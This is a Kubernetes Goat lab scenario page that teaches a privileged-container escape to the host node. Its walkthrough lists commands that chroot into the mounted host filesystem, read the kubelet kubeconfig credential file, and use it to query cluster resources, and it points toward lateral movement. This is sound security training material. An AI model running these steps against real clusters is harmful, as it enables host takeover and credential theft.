---
title: ⎈ Container escape to the host system
sidebar_label: Welcome
sidebar_position: 2
description: Gain access to host system by escaping out of the container in Kubernetes Container - Kubernetes Goat Scenario 🚀
slug: container-escape-to-the-host-system-in-kubernetes-containers/welcome
---

# ⎈ Container escape to the host system

## 🙌 Overview

This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.

![](../images/scenario-4.png)

By the end of the scenario, you will understand and learn the following:

1. Able to exploit the container and escape out of the docker container
2. You will learn to test and exploit the misconfigured and privileged containers
3. Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments

### ⚡️ The story

Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.

:::info

To get started with the scenario, navigate to [http://127.0.0.1:1233](http://127.0.0.1:1233)

:::

![Scenario 4 Welcome](../images/sc-4-1.png)

### 🎯 Goals

The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.

:::tip

Gain access to the host system and obtain the node level kubeconfig file `/var/lib/kubelet/kubeconfig`, and query the Kubernetes nodes using the obtained configuration.

:::

### 🪄 Hints & Spoilers

<details>
  <summary><b>✨ Are you still in the container? </b></summary>
  <div>
    <div>See the mounted file systems, also look the capabilities available for the container using <b>capsh</b> 🙌</div>
  </div>
</details>

<details>
  <summary><b>✨ Escaped container? </b></summary>
  <div>
    <div>You can recon the system, some interesting places to obtain the node level configuration are <b>/var/lib/kubelet/kubeconfig</b> and I hope you know how to query Kubernetes API for nodes? 🎉</div>
  </div>
</details>

## 🎉 Solution & Walkthrough

### 🎲 Method 1

- After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.

```bash
capsh --print
```

```bash
mount
```

- Now you can explore the mounted file system by navigating to the `/host-system` path

```bash
ls /host-system/
```

![Scenario 4 host system](../images/sc-4-2.png)

- You can gain access to the host system privileges using `chroot`

```bash
chroot /host-system bash
```

- As you can see, now you can access all the host system resources like docker containers, configurations, etc.

```bash
docker ps
```

![Scenario 4 chroot host](../images/sc-4-3.png)

- The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.

```bash
cat /var/lib/kubelet/kubeconfig
```

![Scenario 4 kubelet config](../images/sc-4-4.png)

:::tip

You can use the available `kubectl` command-line utility to explore other resources using the obtained configuration. Also, you can leverage lots of other potential things by using the available utilities or downloading them as required.

:::

- Using the kubelet configuration to list the Kubernetes cluster-wide resources

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```

![Scenario 4 get kube-system](../images/sc-4-5.png)

:::info

From here you can go beyond by performing the lateral moment and a post-exploitation based on the available setup, configuration, and resources
:::

- You are able to obtain the available nodes in the Kubernetes cluster by running the following command:

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes
```

- Hooray 🥳 , now you can see that it returns the cluster nodes available as we have the privilege/permissions with obtained configuration to query the Kubernetes API server


## 🔖 References

- [Realworld case study of exploiting cap_sys_ptrace capability](https://madhuakula.com/content/attacking-and-auditing-docker-containers-using-opensource/attacking-docker-containers/capability.html)
- [Abusing Privileged and Unprivileged Linux Containers - NCC Group Whitepaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
- [Understanding and Hardening Linux Containers - NCC Group Whitepaper](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
